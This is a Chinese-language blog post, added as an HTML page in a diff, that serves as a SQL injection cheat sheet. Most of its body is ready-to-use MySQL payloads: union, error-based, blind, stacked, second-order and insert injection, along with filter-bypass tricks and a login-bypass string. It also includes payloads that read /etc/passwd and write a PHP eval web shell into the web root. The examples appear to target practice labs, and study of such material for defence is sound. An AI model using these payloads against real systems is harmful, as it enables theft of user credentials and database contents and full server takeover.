@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <meta name="author" content="Magi2B0y" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      重新认识SQL注入 
+      
+      
+      |
+    
+     Hexo
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/cat-avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">MagicBoy</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">重新认识SQL注入</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2023-02-21 11:11:54
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="网络安全">
+                    <b>#</b> 网络安全
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="前期工作"><a href="#前期工作" class="headerlink" title="前期工作"></a>前期工作</h1><p>找寻注入点</p>
+<p>判断注入类型（数字型&#x2F;字符型）</p>
+<p>字符型注入判断闭合方式：<code>&#39; 、 &quot; 、 ) 、 &#39;) 、 &quot;) 、 %) 、 %</code></p>
+<p>判断注释方式：<code>%23 、# 、 --+ 、 %00</code></p>
+<p>然后利用 and 连接条件进行最后判断是否存在注入点</p>
+<p>万能密码登录：username&#x3D;admin’ or ‘1’&#x3D;’1<br>对应sql语句可能为：<code>select username,password from users where username=&#39;$username&#39; and password=&#39;$password&#39; limit 0,1;</code></p>
+<h1 id="1-联合注入"><a href="#1-联合注入" class="headerlink" title="1. 联合注入"></a>1. 联合注入</h1><p>有回显时：</p>
+<p>利用 order by 判断列数</p>
+<p><code>?id=&#39;1&#39; order by 3 --+</code></p>
+<p>利用 union select 判断回显位置</p>
+<p><code>?id=&#39;-1&#39; union select 1,2,3 --+</code></p>
+<p>查库名、用户名</p>
+<p><code>?id=&#39;-1&#39; union select 1,database(),user() --+</code></p>
+<p>查询表名</p>
+<p><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;   --+</code></p>
+<p>查询列名</p>
+<p><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;  --+</code></p>
+<p>查询字段值</p>
+<p><code>?id=-1&#39; union select 1,group_concat(id,&#39;:&#39;,username,&#39;:&#39;,password),3 from users  --+</code></p>
+<p>读取文件</p>
+<p><code>?id=-1&#39; union select 1,load_file(&quot;/etc/passwd&quot;),3  --+</code></p>
+<p>写入文件</p>
+<p><code>?id=-1&#39; union select 1,&quot;&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;&quot;,3 into outfile &quot;/var/www/html/muma.php&quot; --+</code></p>
+<p>hex绕过</p>
+<p><code>?id=-35 union select 1,2,user(),4,5,6,7,8,9,10,unhex(hex(group_concat(table_name))),12,13,14,15 from information_schema.tables where table_schema=&#39;cms&#39; %23</code></p>
+<h1 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2. 报错注入"></a>2. 报错注入</h1><p>无回显时：</p>
+<h2 id="2-1-floor-报错注入"><a href="#2-1-floor-报错注入" class="headerlink" title="2.1. floor()报错注入"></a>2.1. floor()报错注入</h2><p>原理可查看这篇文章 –&gt; <a target="_blank" rel="noopener" href="https://blog.csdn.net/cried_cat/article/details/80022378">floor()函数报错分析</a></p>
+<p>查数据库名</p>
+<p><code>?id=1&#39; union select null,count(*),concat((select database()),floor(rand(0)*2))as a from information_schema.tables group by a%23</code></p>
+<p>查表名</p>
+<p><code>?id=1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),floor(rand(0)*2))as a from information_schema.tables group by a%23</code></p>
+<p>查列名</p>
+<p><code>?id=1&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1),floor(rand(0)*2))as a from information_schema.tables group by a%23</code></p>
+<p>查字段值</p>
+<p><code>?id=1&#39; union select 1,count(*),concat((select username from users limit 0,1),floor(rand(0)*2))as a from information_schema.tables group by a%23</code></p>
+<h2 id="2-2-extractvalue报错注入"><a href="#2-2-extractvalue报错注入" class="headerlink" title="2.2. extractvalue报错注入"></a>2.2. extractvalue报错注入</h2><p><code>extractValue(doc,&#39;book/author/surname&#39;)</code><br><code>extractValue(列名，book标签下面的author标签下面的surname标签里面的内容)</code></p>
+<p>原理可查看这篇文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/sugar_by/article/details/125098528">sql盲注_extractvalue报错注入</a></p>
+<p>利用报错查询数据库名</p>
+<p><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select database()))) --+</code></p>
+<p>查询当前数据库的表</p>
+<p><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.TABLES where TABLE_SCHEMA=database()))) --+</code></p>
+<p>查询列名</p>
+<p><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name =&#39;users&#39;))) --+</code></p>
+<p>查询字段名</p>
+<p><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,&#39;~&#39;,password) from users)))--+</code></p>
+<p>默认只能返回32字符串，如果返回内容过长，可利用substr分段显示</p>
+<p><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select substring((select group_concat(username,&#39;~&#39;,password) from users),25,30))))--+</code></p>
+<h2 id="2-3-updatexml报错注入"><a href="#2-3-updatexml报错注入" class="headerlink" title="2.3. updatexml报错注入"></a>2.3. updatexml报错注入</h2><p>updatexml报错注入和extractvalue报错注入的原理基本差不多，都是利用插入不符合函数格式的语句并拼接查询语句从而通过函数报错达到我们查询内容的目的；</p>
+<p>基本格式：<code>updatexml(xml_doument,XPath_string,new_value)</code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一个参数：XML的内容</span><br><span class="line">第二个参数：是需要update的位置XPATH路径</span><br><span class="line">第三个参数：是更新后的内容</span><br></pre></td></tr></table></figure>
+
+<p>所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式，其最终还是因为路径产生报错从而达到报错的目的；</p>
+<p>对第二个参数的修改与 <code>2.2. extractvalue报错注入</code> 对第二个参数的修改基本一致</p>
+<h1 id="3-盲注"><a href="#3-盲注" class="headerlink" title="3. 盲注"></a>3. 盲注</h1><h2 id="3-1-布尔盲注"><a href="#3-1-布尔盲注" class="headerlink" title="3.1. 布尔盲注"></a>3.1. 布尔盲注</h2><p>查数据库长度</p>
+<p><code>?id=1&#39; and length(database())=8 --+</code></p>
+<p>查询数据库名，不断替换 substr() 的参数</p>
+<p><code>?id=1&#39; and ascii(substr(database(),1,1))=115 --+</code></p>
+<p>查询数据库中表的数量</p>
+<p><code>?id=1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=3 --+</code></p>
+<p>查询表名的长度</p>
+<p><code>?id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 --+</code></p>
+<blockquote>
+<p>注意length()里面的select语句整体要加上()</p>
+</blockquote>
+<p>查询表名</p>
+<p><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1))&gt;95 --+</code></p>
+<p>查询表中列的数量</p>
+<p><code>?id=1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=3 --+</code></p>
+<p>查询列名的长度</p>
+<p><code>?id=1&#39; and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 2,1))&gt;7 --+</code></p>
+<p>查询列名</p>
+<p><code>?id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=105 --+</code></p>
+<p>查询字段的数量</p>
+<p><code>?id=1&#39; and (select count(username) from users)&gt;12 --+</code></p>
+<p>查询字段的长度</p>
+<p><code>?id=1&#39; and length((select username from users limit 0,1))&gt;1 --+</code></p>
+<p>查询字段名</p>
+<p><code>?id=1&#39; and ascii(substr((select username from users limit 0,1),1,1))=68 --+</code></p>
+<h2 id="3-2-时间盲注"><a href="#3-2-时间盲注" class="headerlink" title="3.2. 时间盲注"></a>3.2. 时间盲注</h2><p>无论输入什么，都返回同样的内容</p>
+<p>判断是否存在时间盲注</p>
+<p><code>?id=1&#39; and if(1=1,sleep(10),1) --+</code></p>
+<p>判断数据库长度</p>
+<p><code>?id=1&#39; and if(length(database())&gt;1,sleep(10),1) --+</code></p>
+<blockquote>
+<p>其余与布尔盲注基本相同，只需替换if中的条件判断</p>
+</blockquote>
+<h1 id="4-堆叠注入"><a href="#4-堆叠注入" class="headerlink" title="4. 堆叠注入"></a>4. 堆叠注入</h1><p>在SQL中，<code>;</code> 是用来表示一条 sql 语句的结束，在结束一个sql语句后继续构造下一条语句，两条 sql 语句一起执行就造就了堆叠注入。</p>
+<p>查询用户数：<code>?id=-1&#39;union select 1,(select count(username) from users),3 --+</code></p>
+<p>显示有十四条数据：</p>
+<p><img src="/./Relearn-sql-injection/4-1.png"></p>
+<p>堆叠注入：<code>?id=1&#39;;insert into users(id,username,password) values (&#39;40&#39;,&#39;less39&#39;,&#39;hello&#39;) --+</code></p>
+<p>查询用户数：<code>?id=-1&#39;union select 1,(select count(username) from users),3 --+</code></p>
+<p>显示有十八条数据：</p>
+<p><img src="/./Relearn-sql-injection/4-2.png"></p>
+<h1 id="5-二次注入"><a href="#5-二次注入" class="headerlink" title="5. 二次注入"></a>5. 二次注入</h1><p>第一阶段：将想要利用的特殊字符（’ 、” 、#）通过正当逻辑，写入到数据库中<br>第二阶段：通过正常逻辑调用写入的特殊字符</p>
+<p>插入注册qq’#用户时可以成功注册</p>
+<p>修改密码 sql语句可能为：<code>update users set password=&#39;$new_password&#39; where username=&#39;qq&#39;#&#39; and password=&#39;$old_password&#39; ;</code></p>
+<p>更改用户密码时，成功修改qq用户的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">SP(注册qq&#x27;#)--&gt; A(注册成功)</span><br><span class="line">A--&gt;B(登陆修改密码)</span><br><span class="line">B--&gt;C(修改成功)</span><br><span class="line">B--&gt;D(修改失败)</span><br><span class="line">C--&gt;E(使用修改后的密码登录)</span><br><span class="line">E--&gt;F(登录qq&#x27;#失败)</span><br><span class="line">E--&gt;G(登录qq&#x27;#成功)</span><br><span class="line">F--&gt;H(尝试登陆qq)</span><br><span class="line">H--&gt;J(登陆成功)</span><br><span class="line">G--&gt;K(闭合方式猜测错误)</span><br><span class="line">K--&gt;L(更换特殊字符再次测试)</span><br><span class="line">SP--&gt;M(注册失败)</span><br><span class="line">M--&gt;N(不存在二次注入)</span><br><span class="line">D--&gt;O(&quot;系统不存在qq的账户，闭合方式猜想正确&quot;)</span><br><span class="line">O--&gt;P(更换用户名再次测试)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="6-insert注入"><a href="#6-insert注入" class="headerlink" title="6. insert注入"></a>6. insert注入</h1><p><code>insert into article VALUES ($a,&#39;$b&#39;,&#39;$c&#39;,&#39;$d&#39;)</code></p>
+<p>可以控制 $b 和 $c 的传入</p>
+<p>令 <code>$b = a&#39;,database(),&#39;1&#39;) #</code></p>
+<p>可构造 <code>insert into article VALUES ($a,&#39;a&#39;,database(),&#39;1&#39;) #</code> 查询数据库名为<code>easy</code></p>
+<p>接着查询表名</p>
+<p>令 <code>$b = a&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;easy&#39;),&#39;1&#39;) #</code></p>
+<h1 id="Bypass技巧"><a href="#Bypass技巧" class="headerlink" title="Bypass技巧"></a>Bypass技巧</h1><p>空格过滤：用 <code>/**/</code> ，<code>%0a</code>代替空格</p>
+<p>关键字被过滤：尝试双写绕过，如将 union 修改为 <code>uunionnion</code></p>
+<p>注释符（# 、 –+）被过滤：用 <code>;%00</code> 进行截断</p>
+<p><code>=</code> 被过滤：使用 <code>like</code> 替代</p>
+<p><code>and</code>，<code>or</code>被过滤：1. 用 <code>&amp;&amp;</code>，<code>||</code> 代替 （注意url编码<code>%26%26</code>，<code>%7C%7C</code>）。2. 用大小写绕过</p>
+<p><code>select</code> 被过滤：大小写绕过</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/02/15/git-learn/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2023-02-21 11:11:54
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="网络安全">
+                        <b>#</b> 网络安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/02/25/learn-file-upload-vulnerability/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E5%B7%A5%E4%BD%9C"><span class="toc-text">前期工作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-text">1. 联合注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">2. 报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-floor-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">2.1. floor()报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">2.2. extractvalue报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">2.3. updatexml报错注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E7%9B%B2%E6%B3%A8"><span class="toc-text">3. 盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">3.1. 布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">3.2. 时间盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">4. 堆叠注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-text">5. 二次注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-insert%E6%B3%A8%E5%85%A5"><span class="toc-text">6. insert注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bypass%E6%8A%80%E5%B7%A7"><span class="toc-text">Bypass技巧</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86SQL%E6%B3%A8%E5%85%A5 + '&url=' + https%3A%2F%2Fmagi2b0y.github.io%2F2023%2F02%2F18%2FRelearn-sql-injection%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://magi2b0y.github.io/2023/02/18/Relearn-sql-injection/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
